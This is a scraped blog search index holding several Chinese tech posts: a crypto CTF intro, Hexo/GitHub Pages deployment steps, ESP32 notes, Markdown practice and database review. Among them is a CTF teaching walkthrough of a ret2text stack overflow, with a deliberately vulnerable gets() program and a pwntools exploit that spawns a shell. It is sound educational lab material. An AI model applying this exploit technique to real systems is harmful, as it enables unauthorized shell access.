现代密码学比古典密码复杂许多，它的加密解密算法不是人能够口算或者笔算出来的东西，因此也需要编程。而密码学由于经常要用到特别大的数字，远超c和c++的long long int的上限，因此一般使用python编写程序。python是一个较接近自然语言的编程语言，因此容易上手，灵活运用搜索引擎以及网上一些教程很容易学会。 英语基础： 你有可能会遇到一些需要阅读纯英文文章才能解决的题目，需要有一定的耐心才能看明白。 密码学需要哪些工具 python 两个用的挺多的python库：pycryptodome，gmpy2（网上均有安装方法，使用方法也有，也可直接查文档） （sagemath）对初学者来说用处不大 如何学习密码学 善用搜索引擎 在ctfwiki的crypto分区寻找一些crypto的基础知识 当我在做题时遇到困难怎么办 先去各大搜索引擎轮番搜一遍 阅读《提问的智慧》 寻找管理员里那个密码fw寻求帮助 当然，就算做题没遇到困难，只要对密码学感兴趣，也欢迎去找那个密码fw闲聊.并教教他密码学，他可菜了。 crypto是个比较小众的方向，但也相当有趣。会有很硬核的数学让人想放弃，但坚持下来慢慢搞，一定会有很大收获。 moectf{I_L0Ve_M@th_AnD_CRypT0}","link":"/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Crypto%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/"},{"title":"GitHub博客搭建","text":"编辑 打算加一部分讲怎么更简洁地部署博客的教程。现在GitHub Actions已经很好用了，完全可以用它进一步简化博客部署步骤 博客站点是一种个人日志记录站点，也是Web1.0-2.0时代撑起互联网主体的重要部分之一。如今虽然它被各大APP不断挤占生存空间，但是它依旧重要：一篇高质量的博文，往往能够成为无数后人解决一个问题的宝贵参考资料。 对于个人而言，如何去写它，利用它由你决定。你可以用它宣传自己，可以把它当作自己的读书笔记甚至课程笔记，也可以用它去记录生活中的时时刻刻。你写出的内容，永远属于你，也可为你所用。 为了防止现场网速太拉，建议大家提前完成下面的准备工作 准备工作软件安装首先需要在电脑上准备好用来写博客&amp;生成静态站点的工具。需要在电脑上安装这些软件： node.js（点击下载） 它是我们安装hexo的工具 git（点击下载） 我们用它向GitHub推送我们生成的静态站 上面的链接如果下不了，也可以看群文件or自己搜 注意：安装node.js的时候，一定保证下图的Add to PATH是确认的。 装好node.js之后，我们需要在电脑上安装hexo，这是生成博客站点的核心工具。 用Win+R键打开运行，输入cmd并回车，在随后弹出来的黑框框中输入下面的指令： 1npm install hexo-cli -g 如果网速太慢，可以用下面的指令： 1npm --registry https://registry.npm.taobao.org install hexo-cli -g 如果输出内容没有红底的ERR，就说明装好了。 GitHub账号注册之后，我们还需要在GitHub上注册一个账号。点击此处前往 在主页上找到Sign Up按钮，点击之后按照注册流程即可。用户名和邮箱是重要信息，后面会用到。 随后我们还需要安装一个MarkDown编辑器，或者装了VS Code也可以用VS Code代替。 推荐几个 MarkDown 编辑器：Typora、Obsidian 开始搭建(ver.1)初始化博客目录 如何用cmd切换到对应文件夹：你可以在文件管理器里打开你的博客目录，然后在地址栏里输入cmd并回车，就像下面这样： 首先，新建一个存放博文的文件夹，例如我是放在C:/Users/[我的用户名]/blog/下的，你们也可以放在其他目录，比如D:/blog。创建对应的文件夹，并在那个目录打开cmd（参考上面的说明）（这个cmd别关，别关，别关，后面大多数操作都会用它） 然后，在cmd中，运行hexo init初始化博客仓库。这个过程可能比较缓慢，失败或者卡住不动的话可以按Ctrl+C停止多试几次 像这样就完成了 此外，还需要安装下面的工具。在同一个框里继续输入就好了： 123npm i hexo-deployer-git # git推送插件npm i hexo-server # 本地预览插件npm i hexo-generator-feed # RSS文件生成插件 建立仓库在GitHub上建立仓库，**名称必须是username.github.io**，其中，username是你的用户名，其余选项默认即可，如下图所示（我已经创建过了所以会标红）。 接着，还是在上面的命令行窗口中，输入下面的指令： 12git config --global user.name &quot;[username]&quot;git config --global user.email &quot;[email]&quot; 把上面的[username]和[email]换成你的GitHub用户名和注册邮箱即可。 配置远程推送完成后，打开博客文件夹，打开_config.yml并翻到最底下： 把这部分用下面的部分覆盖： 1234deploy: type: git repo: https://github.com/[username]/[username].github.io.git branch: main 其中，把[username]替换为你的GitHub用户名即可。 最后，还是在上面的命令行窗口中，执行hexo clean &amp;&amp; hexo d，等待完成即可。 这个过程中，会让你输入GitHub账号密码，跟随提示输入即可。 验证完成之后，在浏览器里访问https://[username].github.io，能看见下面的界面就代表推送配置成功了： 如果没有成功，可以等待2分钟再打开看看。 由于网络问题，上面涉及GitHub和npm的部分，可能会遇到很慢甚至卡死的情况。这种情况只能试几次或者搭梯子解决。 或者，也可以先在本地验证博客是否正确配置。还是在上面的命令行窗口中，输入hexo s，完成后在浏览器里粘贴并打开网址：127.0.0.1:4000，我们就能看到博客是否正确配置。 开始搭建(ver.2)第二版的教程会借助GitHub Action来让博客搭建变得更简单，而且让你的文章目录更加简洁，可维护。 在搭建完成后，我们会得到一个只包含原来的source目录下所有文件的新的目录。并且在编写完成后，只需要使用git push将我们写好的博文推送到GitHub就完成了所有的步骤。 注意：这个版本的教程可能需要一些常用开发工具的使用经验，建议小白先试试上面那个版本的 准备？由于我们将大部分的复杂度都转移到了GitHub上，所以初次配置会更加繁琐。不过别急，让我先急只要跟着步骤做下来基本都没啥问题的。实在不行大不了fork一份仓库然后直接用（不 这次的步骤需要使用到git和hexo两个工具，并且我们需要创建三个分支用来实现自动化博客部署。 啊对了，如果不想自己搭建直接用的话，也不是不可以。只需要打开我的仓库页面，然后点击那个fork，接着到你的仓库下继续操作：首先把.github/workflows/hexo-deploy.yml最后的REPOSITORY_NAME改成你自己博客的名字（xxx.github.io)，然后把仓库名字改成刚才设置的名字，再检查仓库设置的Pages页面和Actions-&gt;General页面的设置项是否和底下的一样。完成后，clone到本地，把我的博文换成你的，再到deploy分支配置好你的博客发布设置，最后push到GitHub检查一下有没有问题即可。 开始！首先，在GitHub上创建你的博客仓库： 特别注意，这里我建这个名字只是作为示范，你们建立仓库的时候直接用用户名.github.io当仓库名就ok 并克隆到本地： 完成后打开： 上面我已经用VSCode打开了。创建好之后，在当前目录下打开命令行工具，再使用下面的命令创建两个分支：deploy和html。 12git branch deploygit branch html 三个分支（main是默认分支）分别用来存储博客文章，保存博客构建工具以及存储生成的博客静态页面。 至此，三个分支就准备好了。下面就是重头戏了。 初始化博客构建工具先用git checkout deploy切换到构建分支，并删除LICENSE和README.md。随后创建一个临时目录tmp，并在其中运行hexo init来初始化博客构建工具hexo。 随后将tmp下除了.git的所有文件移动到文件夹根目录下，并删除tmp目录。然后运行一下npm i再安装下依赖。 然后和上面一样，在根目录下安装必要的依赖： 1npm i hexo-deployer-git hexo-server hexo-generator-feed --save 并更改_config.yml中的最底下的部分如下： 1234deploy: type: git repo: https://github.com/[username]/[username].github.io.git branch: html 这时候应该就可以试着推送一下。没有问题的话会看到这个结果： 这证明我们的推送已经配置好了。如果之前没设置git的用户名和邮箱的话会出问题，设置一下就好了。 然后就随便你怎么定制你的博客了，方法和上面那个版本的教程一样。 最后记得把source下的所有文件移动到文件夹外边，待会会再用到的。这里不移动出去，到时候可能会出现merge合并问题，比较麻烦。 配置主分支这一步是实现自动化的关键。因为其实做到现在这一步，我们其实已经可以用上面第一版的教程部署博客了。这里多增加的，就是一点点git技巧和GitHub技巧啦。 首先，在上面的部署工具配置完成后，使用git add .和git commit -m &quot;deploy branch configure&quot;来将deploy分支的改动保存到这个分支中。 完成这一步后，我们用git checkout main切换到main分支，开始我们最后的工作。不过在这之前，先在根目录添加一个.gitignore，把这几个文件添加进去： 完成之后，我们就可以把之前移出去的source目录下的所有东西移动进来了。 下面是一份GitHub Actions配置清单，先把最底下的REPOSITORY_NAME替换为你的博客仓库地址，随后，把它保存到.github/workflows/hexo-deploy.yml中。 12345678910111213141516171819202122232425262728293031323334353637name: Hexo Deployon: push: branches: - mainjobs: build: runs-on: ubuntu-latest steps: - name: Checkout deploy branch uses: actions/checkout@v2 with: ref: deploy path: ./ - name: Checkout blog repo uses: actions/checkout@v2 with: ref: main path: ./source - name: Set up Node.js uses: actions/setup-node@v2 with: node-version: 14 - name: Install dependencies run: | npm install &amp;&amp; npm run build - name: Deploy uses: JamesIves/github-pages-deploy-action@releases/v3 with: REPOSITORY_NAME: xeonds/hexo-actions BRANCH: html FOLDER: public 保存更改并推送到GitHub： 123git add .git commit -m &quot;main workflow configure&quot;git push -u origin deploy 这次推送会触发GitHub Action，并且会失败。完成接下来的配置之后，我们的配置才能算彻底完成。 GitHub仓库配置现在可以关掉其他东西，打开浏览器了。找到我们的仓库，点开设置并找到Pages选项卡： 按照上图的设置进行配置：首先在Source选项中，选择Deploy from a branch，然后在Branch选项中，选择html分支的/(root)目录作为部署的源路径。 保存之后，在左侧找到Actions &gt; General选项卡： 翻到最底下，把Workflow Permossions的选项改成Read and write permissions，然后保存。 到这里，我们的配置工作就基本结束了。 验证部署结果打开我们的博客目录，在_posts目录下写一篇新的博客，并标注frontmatter信息后，在git中提交并推送它到GitHub。 随后，等待大概1分钟左右，打开你的仓库首页，查看GitHub Action运行情况： 一切顺利的话，就会看到成功的对勾和右下角的Environments为Active。此时打开你的GitHub Pages链接（通常是https://[用户名].github.io/），应该就能正常看到你的博客首页了。 如果出现异常，你可以去GitHub Action页面中查看你的Workflow详情，并根据报错信息在网上找解决方案（实在不行也可以问问New Bing之类的）。 总之是结束了，可喜可贺，可喜可贺。 写这篇教程的时候，看到了不少和我思路一样的，不过不少都因为时效性问题无法部署，而且我的部署方式比较特别，是一个仓库实现hexo配置存储、博客文章存储以及静态页面预览，所以操作方法也不太一样。总之想了下还是写了这篇教程。以及中间关于Actions权限设置的问题，我翻了好久才在一个Issue里看到解决方案，之前真的是一头雾水。如果去翻翻官方文档的话，应该能更早解决吧不管了反正终于结束了删库跑路删库跑路 开始写作！一篇博客的写作流程大概是这样： 在博客目录打开命令行，输入 hexo new &quot;文章标题&quot; 来创建一篇新文章 用写作软件打开上面创建的文件，开始写作 完成之后，在命令行中输入 hexo clean &amp;&amp; hexo d 发布文章到GitHub 熟悉写作流程之后，就可以对博客进行进一步定制了，比如安装主题，安装其他插件等。后续我会列出来一些参考资料（＾-＾） Obsidian+Hexo=?Obsidian（黑曜石）是一个很好用的专业Markdown写作和管理工具。下面我简单介绍下用Obsidian结合hexo进行博客写作的流程。 首先，安装Obsidian，下不下来就用梯子。安装完成后打开你的博客文件夹： 打开之后进入设置，在文件与链接最底下的忽略文件中添加node_modules、scaffolds、public和themes四个文件夹。随后往上拉，存放新建笔记的文件夹改为source/_posts。 还是在设置中，点击左侧模板，模板文件夹位置选择scaffolds。然后关闭设置，点开scaffolds目录： 改为下面的格式即可（author后面改成你自己的名字）。简单介绍下，title标题，date文章创建日期，author作者，toc目录（table of contents），excerpt文章简介，tags文章标签。 如果是使用部署方案2，那么只需要用obsidian打开仓库根目录，然后把scaffolds目录复制到博客目录里，然后改名成_scaffolds，然后把你要添加的模板添加到目录里，再在设置里改好，就能愉快地使用了。另外，不要忘了忽略node_modules之类的目录。 到这里就配置完了。接下来讲讲写作流程： 打开Obsidian，新建文章并确定好标题。随后点击左侧模板图标，选择post模板，它会根据模板格式自动生成文章标题、作者、时间等文章元信息，随后就是写作了。 完成后，在博客目录打开命令行，运行hexo s预览博客发布后的效果，确认无误后使用hexo g &amp;&amp; hexo d来生成并发布博客到GitHub Pages。当然，如果还能折腾的动，还可以使用Obsidin的Git插件+Git命令在Obsidian中一键发布博客。 如果是使用方案2部署，那么就更简单了。直接把博客目录作为Markdown仓库打开，并设置好Obsidian Git插件，配置好模板目录。写作完成后，直接Ctrl+P来commit+push就行，直接推送到远程仓库，让GitHub Actions帮你发布到html分支上。 这应该就是折腾的尽头了。如果你还想再折腾的话，那可以试试更改之前的workflow，来添加你的自定义操作，比如一键部署到你的服务器上，或者邮件通知发布结果之类的。","link":"/2022/11/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/GitHub%E5%8D%9A%E5%AE%A2%E6%90%AD%E5%BB%BA/"},{"title":"Linux上的ESP32+MicroPython开发手记","text":"Ref:ESP32-MicroPython 开发环境 - orangeQWJ - 博客园 之前一直想在Linux上玩玩手头的ESP32板子，但是奈何开发工具（好像叫Thonny）兼容Win，也懒得在Linux上再装一个。最近有空了才研究了一下，发现把板子插上，系统里是会出现一个字符设备的。不过大前提是ESP32的板子是MicroPython固件应该才行。 连接终端 [转载]各种终端 /dev/tty - 苏小北1024 - 博客园 既然设备在/dev底下显示了，那肯定就能连上。在Win上的时候IDE会自动连接上设备的MicroPython的repl解释器。Linux底下根据参考资料应该是可以借助screen连接。我的设备显示为/dev/ttyUSB0，那么就使用下面的指令以115200的波特率连接： 1screen /dev/ttyUSB0 115200 连接后能看到确实是MicroPython的repl。 这里补充一下screen的使用，这里的C-x指的是Ctrl+x这样的组合键： C-a d：断开当前screen的连接 C-a k：终止当前screen的连接。完成repl交互的时候务必终止，不然会阻碍ampy的连接 screen -R：恢复screen的连接 文件传输虽然能用repl的os.listdir()和文件操作查看源码和其他文件的内容，但是还是不太方便。搜了一下发现Adafruit提供了一个用于在MicroPythhon兼容设备上文件管理的工具。我这里直接从AUR安装了： 1yay -S ampy 装好之后，可以先设置一下环境变量，省得每次都要指定端口号： 1echo &quot;export AMPY_PORT=/dev/ttyUSB0&quot; &gt;&gt; $HOME/.bashrc 之后就不用指定下面所有的--port /dev/ttyUSB0参数了。 ampy --port &lt;PORT&gt; ls [REMOTE_DIR]：列出文件 ampy --port &lt;PORT&gt; get &lt;REMOTE_FILE&gt; [LOCAL_FILE]：下载文件，输出到stdout/本地文件 ampy --port &lt;PORT&gt; put &lt;FILE&gt;：上传文件 ampy --port &lt;PORT&gt; rm &lt;REMOTE_FILE&gt;：删除文件 ampy --port &lt;PORT&gt; mkdir &lt;DIR&gt;：创建文件夹 ampy --port &lt;PORT&gt; run &lt;REMOTE_SCRIPT&gt;：执行远程脚本 特殊文件MicroPython固件会在开机时先执行/boot.py，再执行/main.py主程序。如何编写就看程序的设计了。 PS：为了快速复制引用的网页还抽了半个小时做了个插件：xeonds/tab-clip: Extension for clip the site info in markdown url format虽然感觉有点傻就是了）","link":"/2024/07/05/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Linux%E4%B8%8A%E7%9A%84ESP32+MicroPython%E5%BC%80%E5%8F%91%E6%89%8B%E8%AE%B0/"},{"title":"Markdown语法练习","text":"0.分割线 123***---___ 1.斜体，粗体和删除线斜体 粗体 删除线 12345*斜体***粗体**~~删除线~~ 2.分级标题最多6级由#的数量决定12### 最多6级##### 由#的数量决定 3.外链如下所示： 内联式：百度 参考式：[文字描述][链接标签名字] 链接本身： https://www.zhihu.com 123* 内联式：[百度](https://www.baidu.com)* 参考式：[文字描述][链接标签名字]* 链接本身： &lt;https://www.zhihu.com&gt; 4.无序列表 1123123 2123123 3123123 123* 1123123* 2123123* 3123123 5.文字引用比如说 苟利国家生死以，岂因祸福避趋之 1&gt;苟利国家生死以，岂因祸福避趋之 6.行内代码块比如说，#include &lt;stdio.h&gt;就像这样，会亮起来 1比如说，`#include &lt;stdio.h&gt;`就像这样，会亮起来 7.插入图像 1![Google图片](https://cdn2.mhpbooks.com/2016/02/google.jpg) 8.代码引用123#include &lt;stdio.h&gt;int main(void)...... 9.表格 daze daze daze daze dazedazedaze daze 123|daze|daze|daze||:-|:-:|-:||daze|dazedazedaze|daze 10.数学：LaTex这是行内公式，会像普通文本一样靠左对齐：$f(x)=x^2+2x+1=(x+1)^2$ 这是单行公式，会自动居中：$$f(x)=\\int_{-\\infty}^\\infty\\hat f{\\xi},e^{2\\pi i\\xi x},d\\xi$$ 咱也不知道写的啥东西（乱写的XD） 泰勒级数$$f(x)=f(x_0)+f’(x_0)(x-x_0)+…$$ 顺便，关于LaTex，可以看这个视频了解更多：LaTex中文教程 123456789101112$f(x)=x^2+2x+1=(x+1)^2$$$f(x)=\\int_{-\\infty}^\\infty\\hat f{\\xi}\\,e^{2\\pi i\\xi x}\\,d\\xi$$### 泰勒级数：$$f(x)=f(x_0)+f'(x_0)(x-x_0)+...$$ 源码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768关键内容基本都写了一遍，留供参考。&lt;!--more--&gt; //这里注意一下，这个标签是控制文章列表页预览内容多少的## 0.分割线***---___## 1.斜体和粗体*斜体***粗体**## 2.分级标题### 最多6级##### 由#的数量决定## 3.外链如下所示：* 内联式：[百度](https://www.baidu.com)* 参考式：[文字描述][链接标签名字]* 链接本身： &lt;https://www.zhihu.com&gt;[链接标签名字]:https://www.google.com## 4.无序列表* 1123123* 2123123* 3123123## 5.文字引用比如说&gt;苟利国家生死以，岂因祸福避趋之## 6.行内代码块比如说，`#include &lt;stdio.h&gt;`就像这样，会亮起来## 7.插入图像 ![Google图片](https://cdn2.mhpbooks.com/2016/02/google.jpg)## 8.代码引用`` `#include &lt;stdio.h&gt;int main(void)......`` `注：这三个撇是连着的，因为显示问题故以空格分割。## 9.表格|daze|daze|daze||:-|:-:|-:||daze|dazedazedaze|daze## 10.数学：LaTex$f(x)=x^2+2x+1=(x+1)^2$$\\gamma$$$f(x)=\\int_{-\\infty}^\\infty\\hat f{\\xi}\\,e^{2\\pi i\\xi x}\\,d\\xi$$","link":"/2020/12/19/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Markdown%E8%AF%AD%E6%B3%95%E7%BB%83%E4%B9%A0/"},{"title":"Pwn从入门到入狱","text":"Pwn从入门到入狱Copyright © 2020 arttnba3,XDSEC 简介：什么是Pwn？Pwn这个词本身其实是一个拟声词，最初来源于黑客们设想中的完全获取一台设备的控制权后便会发出“砰”的一声，Pwn因此而得名，即利用挖掘到的二进制漏洞对设备或系统发起攻击，并最终拿到shell（获取控制权） Pwn也是最能代表原教旨主义黑客的一个安全研究方向同时也是最容易进监狱的一个方向 预备知识作为二进制安全的分支之一，Pwn需要你熟练掌握如下基础知识： 主流平台汇编语言，包括但不局限于X86、MIPS等 C语言 计算机组成原理 计算机操作系统 静态分析（IDA）&amp;动态调试（GDB） Python 编译原理 …… 看完你可能会感觉有一丶丶头大，不过少有人是先把计科专业本科的内容全部学完才开始学pwn的，大家都是一边比赛一边学习的，所以不用担心因为自己0基础导致无法入门的情况的发生 CTF TO LEARN, NOT LEARN TO CTF Pwn的解题过程？ 题目的二进制文件一般会被部署到服务器上，使用nc xx.xx.xx.xx(ip) xxxx(端口)命令可以与服务器进行交互。并且该二进制文件的副本（与服务器上的完全相同或者基本相同）将作为附件形式被提供给选手下载。 你需要逆向分析二进制文件副本中存在的可利用漏洞，针对其编写Exploit(漏洞利用脚本)，然后向服务器发起攻击，拿到服务器上保存的flag文件或字符串，将其提交至本平台。 注意命令行中的nc并不是做题工具，你需要在Linux下安装pwntools库（或者其它），用于编写可用性较高的Exploit。至于如何安装，如何使用，就需要聪明的你发挥自己的学习能力啦~ 0基础入门：新人的第一个安全漏洞的利用——栈溢出——ret2text 前置知识要求 C语言基本语法 Python语言基本语法 能大致看得懂C程序、有写简单的Python程序的能力即可 前置环境要求 Windows Linux 我们的一部分工作需要在Windows上完成，另一部份工作则需要在Linux中完成 你可以在windows上运行Linux虚拟机，也可以直接在真机运行linux 注：linux环境下由于默认的远程软件库是国外的源，下载速度可能会比较慢 百度“Linux 换源”与“pip 换源”更换Linux下的软件源为国内的软件源，提高下载速度不同的Linux发行版本（如Ubuntu、Kali、manjaro等）请自行将搜索框内的“linux”换为对应的发行版名称 以下内容将通过几个样例简单地帮助你入门Pwn 以下内容操作环境位于Linux我们现在来看这样的一个程序： 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;using namespace std;void backdoor(void){ system(&quot;/bin/sh&quot;);}void func(void){ char str[20]; puts(&quot;tell me your name plz:&quot;); gets(str);}int main(void){ func();} 我们使用-fno-stack-protector、-z norelro、-z execstack、-no-pie这四条编译指令把这个程序的保护都给关掉 安全检查：checksec使用checksec指令可以查看程序的保护开启情况 可以在控制台输入如下指令安装： 1sudo apt install checksec 逻辑分析这个程序做了些什么？ 定义了一个后门函数backdoor()，但是并未调用 分配了20个字节大小的内存空间给到char类型数组str 使用gets()函数从标准输入流读入字符串并写入数组str内 我们可以看到当我们在编译时编译器给了一个警告，这是因为gets()函数并未限制读入的字符的数量，若是用户输入超过20个字符的数据，则会发生栈溢出，轻则会使程序崩溃，重则可能让不法分子获取系统的最高权限 我们尝试着输入超过20个字节的字符串，看看会发生些什么： 程序崩溃，提示Segmentation fault（段错误），即该程序尝试访问了不属于他的内存空间 但是我们的程序执行流程明明很常规，代码里也没有任何的奇怪的操作，为什么输入不一样就会导致程序崩溃呢？ 以下内容操作环境位于WindowsIDA：逆向分析通常情况下，我们所拿到的都是软件的发行版，而不是源代码，我们无法直接看出漏洞存在于哪个地方，故我们需要一个工具来尽可能地还原整个程序的运行过程，这就要借助到一个工具——IDA 我们尝试使用IDA对程序进行逆向分析 注：IDA软件本体在moeCTF 2020群内有下载，你也可以选择通过搜索引擎获取一个IDA，或者直接在官网购买正版IDA 当我们将程序拖入IDA后，除了我们自己写的backdoor()函数、func()函数及main()函数之外，我们可以看到IDA还解析出来很多奇奇怪怪的函数， 这些预料之外的函数我们目前暂时不需要管（以后会学到的），我们目前只需要分析程序的主逻辑函数即可，双击main函数，我们便可以看到反汇编得到的汇编代码 同样地，双击func函数我们也可以看到其原始的汇编代码 F5键：使用IDA进行逆向分析的神器当我们选中一个函数时，我们可以按下F5键，将汇编代码反编译为C语言的代码，使我们能够更好的分析程序执行流程 要注意的是不要完全依赖于F5键进行逆向分析，反编译出来的C语言代码不一定准确、易读，汇编代码的审计与程序的动态调试同样重要 如：纯汇编编写的程序反编译出来的代码不知所云的情况常常出现 如：C++程序很多时候逆出来就是一坨shit，没有强大的代码功底你很难搞明白程序究竟做了些什么，如下图（注释是我以前做这道题的时候手动打上的，可能有错，别深究Or2） push是什么？mov是什么？retn又是什么？他们都做了些什么？或许目前对于你而言这是完全陌生的一些东西，不过随着逐步深入的学习，你将会逐渐了解到其含义与作用 以下内容操作环境位于Linux栈帧为什么这个程序的汇编代码长这个样子？这就涉及到C函数调用的一个比较重要的概念——栈帧（Stack Frame） 推荐阅读——《程序员的自我修养》第10章 在讲栈帧之前，我们先简单地讲一讲什么是栈 在数据结构中，栈（stack）是一种受限线性表，在线性表上插入与删除数据的操作都只能在数据表的一端——栈顶进行操作，因此栈也是一种LIFO表（Last-in-First-out） 在操作系统中，对动态内存的规划与使用是与数据结构中的栈相似的，我们称之为“栈内存”，用以存储函数内部（包括main函数）的局部变量和方法调用和函数参数值；栈内存是由系统自动分配的，一般速度较快；存储地址是连续且存在有限栈容量，会出现溢出现象程序可以将数据压入栈中，也可以将数据从栈顶弹出。压栈操作使得栈增大，而弹出操作使栈减小。 栈用于维护函数调用的上下文，离开了栈函数调用就没法实现。 当程序每次进行函数调用的时候，都会在调用栈上维护一个独立的栈帧，用以储存属于这个函数的数据与基本信息，包括如下信息： 函数的返回地址和参数 临时变量: 包括函数的非静态局部变量以及编译器自动生成的其他临时变量 想象如下一个空的栈： 需要注意的是：在内存当中，栈是由高地址向低地址方向增长的 这里引入一个新的概念——栈指针寄存器SP（Stack Pointer）与帧指针寄存器BP（Frame Pointer），这两个寄存器用以管理栈帧，其中SP寄存器永远指向栈顶，BP寄存器用以进行对栈内数据的访问 当我们要调用一个函数时，首先会先将下一条的地址压入栈中，作为返回地址，这一步在原函数内完成，当函数执行流程结束后，程序会通过这个返回地址返回到该函数的上一层的调用地址 我们还是以刚刚反汇编出来的代码进行分析： 右键菜单可以切换到文本模式，也可以切换回图标格式，文本模式方便我们得以一窥程序原貌，图标模式则方便我们理解函数内的逻辑 12345678910111213141516171819202122.text:000000000040055A ; Attributes: bp-based frame.text:000000000040055A.text:000000000040055A public func.text:000000000040055A func proc near ; CODE XREF: main+4↓p.text:000000000040055A.text:000000000040055A var_20 = byte ptr -20h.text:000000000040055A.text:000000000040055A ; __unwind {.text:000000000040055A push rbp.text:000000000040055B mov rbp, rsp.text:000000000040055E sub rsp, 20h.text:0000000000400562 lea rdi, s ; &quot;tell me your name plz&quot;.text:0000000000400569 call _puts.text:000000000040056E lea rax, [rbp+var_20].text:0000000000400572 mov rdi, rax.text:0000000000400575 mov eax, 0.text:000000000040057A call _gets.text:000000000040057F nop.text:0000000000400580 leave.text:0000000000400581 retn.text:0000000000400581 ; } // starts at 40055A.text:0000000000400581 func endp 接下来就来到了我们看到的前两行汇编代码：push rbp与mov rbp, rsp，我们不难从指令的英文释义上知道其流程： 将bp寄存器的值压入栈中 将sp寄存器的值赋给bp寄存器 接下来的sub rsp, 20h指令的作用是开辟栈空间，处在sp与bp之间的这一块区域便用于储存数据 我们的char str[20];所占用的空间也在这里，同时我们可以发现我们虽然只分配了20个字节给str，但是程序却开辟了0x20个字节的数据，这是因为程序还要储存一些其他的数据（以后会学到） 那么接下来就进入到我们对gets()函数的漏洞的利用过程了，由于其不限制我们输入的字符串的长度，我们可以将返回地址前面的数据全部填充（padding）掉，并将返回地址覆写为别的地址，改变程序的执行流程 我们最终的目的是获取到shell，那么只要程序当中存在着system(&quot;/bin/sh&quot;)的函数调用，我们再将程序返回到其地址上，即可get shell 构造payload如下 1payload = b'A'*(0x20+8) + p64(sys_addr) # 别忘了8字节的rbp哟 我们之前在程序当中写了一个backdoor()函数，其中包含有能够getshell的语句，同时我们在IDA中可以看到其地址为0x400547 攻击神器：pwntools接下来我们就需要考虑到如何将我们所构思出来的payload给输入到程序中了，那么这里我们就要用到一个对于每一位Pwner都十分重要的python库——pwntools pwntools需要在Linux系统下使用（如Ubuntu、manjaro、kali等） 在shell中输入如下指令安装pwntools 1$ sudo pip install pwntools 使用pwntools库我们可以很方便地输入相应的payload 接下来我们就该开始构造我们用以get shell的脚本了，利用pwntools库，构造exp如下： 12345678910111213from pwn import * # 从pwntools库中导入所需要的一切p = process('./test') # 运行一个程序 # 需要注意的是，在连接远程服务器的时候，使用的是remote() # p = remote(addr,port) # 如：p = remote('sec.arttnba3.cn',10001)p.recv() # 从程序中读取输入直到下一个断点（如遇到输入语句）sys_addr = p64(0x400547) # 将地址构造为符合小端模式的bytes数组，长度为8 # 需要注意的是在32位下应当使用p32()，长度为4payload = b'A'*0x28 + sys_addr # 构造我们的payloadp.sendline(payload) # 向程序发送我们的输入 # 需要注意的是，sendline()会在末尾添加换行符'\\n' # 若不想要发送多余的换行符，可以使用send()方法p.interactive() # 程序进入interactive模式，即进入我们与程序直接交互的界面 成功get shell 至此，我们已经完成了从0开始利用gets()函数的栈溢出漏洞获取最高权限的整个过程，接下来就该靠你自己的努力，去分析、利用每一个可以被利用的系统漏洞，夺取最高权限了 为了拥有“能够getshell任意一台设备”的能力而努力吧！新生代的黑客们！ 1moectf{PWN_T0_0WN!}","link":"/2021/07/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E5%85%A5%E7%8B%B1/"},{"title":"Software Preservation Group","text":"HomePage","link":"/2022/11/25/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/Software%20Preservation%20Group/"},{"title":"数据库复习笔记","text":"这学期学的数据库主要偏向应用，理论部分相对比较少，重点如下： 数据库系统概论 大纲 绪论 特点，概念，发展 数据模型：层次，网状，关系 结构：三级模式，二级映像 组成 关系数据库 关系数据结构 关系操作！ 关系完整性：实体完整性，参照完整性，用户定义的完整性 关系代数！ SQL 定义{模式，表，索引，数据字典} 查询：单表，连接，嵌套，集合，派生表 更新：插入，修改，删除 空值，试图 安全性 安全性控制：用户身份控制，存取控制，自主存取控制,授权/收回，抢注存取控制方法 视图 - 审计 - 数据加密 数据库完整性 实体完整性，参照完整性，用户定义的完整性 完整性约束命名子句 断言 触发器 关系数据理论 规范化 函数依赖 - 码 - 范式 - 2NF - 3NF - BCNF - 多值依赖和4NF 数据依赖的公理系统 - 模式分解 数据库设计 数据字典 概念模型 E-R模型及其扩充 数据库编程 嵌入式SQL：处理过程，通信（游标，动态SQL） 过程化SQL 存储过程和函数 ODBC编程 关系查询处理和查询优化 查询处理步骤，优化 代数优化，物理优化 数据库恢复技术 事务概念和特点 - 恢复概述 - 故障种类，恢复技术和策略 并发控制 整理的不是特别全乎，不过也涵盖不少了。往年大题就那几道，题型相对固定，针对性做题，做会题就算复习完了。 上面的知识点里边特别重要的就那几个：关系代数，关系完整性，SQL，关系数据理论和事务与并发，查询优化这几个。其他零碎的小知识点有印象就行了。 复习方法一是做题，最好是看答案；二是看例子，例题，然后递归复习知识点，效率最高。三是下策，先看知识点，再做题，适合开始复习比较早，时间充裕的情况，也是最充分的复习，但是问题是容易动力不足。 SQLCREATE,DROP,ALTER1234567891011121314151617181920212223CREATE SCHEMA &lt;&quot;name&quot;&gt; AUTHORIZATION &quot;username&quot;;DROP SCHEMA &quot;name&quot; [CASCADE/RESTRICT];CREATE TABLE &quot;name&quot;{ Col1 VARCHAR(10) PRIMARY KEY, Col2 NUMBER(10) NOT NULL UNIQUE, Col3 INT FOREIGN KEY(Sno) REFERENCES TABLE2(Sno), CHECK(Col1 &gt; 1 AND Col1 &lt; 10)};CREATE TABLE schema.tablename{ // 同上};CREATE SCHEMA &quot;name&quot; AUTHORIZATION &quot;user&quot; CREATE TABLE &quot;table1&quot;{ // 同上};ALTER TABLE &quot;name&quot; [ADD COLUMN name VARCHAR(10) | ADD UNIQUE(Cname) | ADD FOREIGN KEY(Cno) REFERENCES Student(Cno) | DROP Col1 CASCADE|RESTRICT DROP CONSTRAINT “completeness” CASCADE|RESTRICT ALTER COLUMN Col1 VARCHAR(114514)];DROP TABLE &quot;name&quot; 